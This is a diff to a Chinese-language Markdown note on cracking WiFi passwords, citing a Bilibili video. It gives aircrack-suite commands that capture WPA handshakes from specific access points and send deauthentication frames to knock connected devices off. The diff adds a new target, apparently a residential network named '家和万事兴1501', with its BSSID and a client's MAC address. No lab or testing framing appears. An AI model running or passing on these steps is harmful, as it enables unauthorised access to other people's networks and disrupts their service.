@@ -1,5 +1,5 @@
 
-# wifi破解：
+#：
 
 >参考视频：https://www.bilibili.com/video/BV1nvceznEN3?t=5.2
 
@@ -21,11 +21,11 @@
 `airodump-ng --bssid CA:4B:18:D4:E8:6F -c 11 -w jaden wlan0mon`
 
 `airodump-ng --bssid D4:DA:21:5D:FF:4E -c 11 -w jaden wlan0mon`
-
+airodump-ng --bssid D0:76:E7:AC:DA:32 -c 1 -w jaden wlan0mon
 `-c`是选择频道，我抓下面的荣耀magicwifi的包，它的频道是11,`-w`是将抓到的数据包保存起来，保存到当前目录下的jaden文件中   
 
 4、断开已经连接wifi的设备，让他重新连接，为了就是要握手包，如果有人正好这时候连接wifi呢，就不需要断开某些设备了。
-
+aireplay-ng -0 2 -c 50:2D:BB:D0:1F:51 -a D0:76:E7:AC:DA:32 wlan0mon
 `aireplay-ng -0 2 -c 12:E2:C9:BA:2D:88 -a D4:DA:21:5D:FF:4E wlan0mon`
 |命令|模式|次数|cc|客户机MAC|xx|WiFi的MAC|网卡|
 |------------|---|-|----|-------------------|---|-------------------|---------|
@@ -49,3 +49,10 @@
 
 前面抓过包，可能不是jaden-01.txt,也可能是02、03等，找数字最大的那个cap文件
 即可。
+
+
+
+
+
+
+ D0:76:E7:AC:DA:32  -71        4        0    0   1  270   WPA2 CCMP   PSK  家和万事兴1501 
